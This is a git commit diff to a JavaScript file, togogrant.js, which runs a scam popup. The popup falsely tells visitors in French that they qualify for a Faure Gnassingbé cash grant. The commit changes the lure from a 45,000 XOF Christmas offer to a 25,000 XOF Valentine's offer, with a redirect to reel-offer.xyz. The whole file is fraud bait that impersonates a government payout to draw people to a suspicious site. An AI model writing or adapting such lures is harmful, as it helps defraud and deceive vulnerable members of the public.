643900e7f4e59bb209dd0d858552cd015220bb50
bigetijazz17 <bigetijazz17@gmail.com>
2025-02-07 07:35:12 +0100

    Update togogrant.js

--- togogrant.js
+++ togogrant.js
@@ -1,6 +1,6 @@
 
 var password = 'RECLAMER 45,000 XOF'
-password=prompt('SMS: Félicitations, vous êtes admissible à FAURE GNASSINGBÉ 45,000 XOF SUBVENTION EN ESPÈCES DE NOËL POUR TOUS, Veuillez appuyer sur OK pour RECLAMER Prix ​​en espèces','RECLAMER 45,000 XOF');
-if (password != 'RECLAMER 45,000 XOF') {
-location.href='https://www.reel-offer.xyz/Retirer-45000XOF';
+password=prompt('SMS: Félicitations, vous êtes admissible à FAURE GNASSINGBÉ 25,000 XOF SUBVENTION EN ESPÈCES SAINT-VALENTIN POUR TOUS, Veuillez appuyer sur OK pour RECLAMER Prix ​​en espèces','RECLAMER 25,000 XOF');
+if (password != 'RECLAMER 25,000 XOF') {
+location.href='https://www.reel-offer.xyz/Retirer-25000XOF';
 }
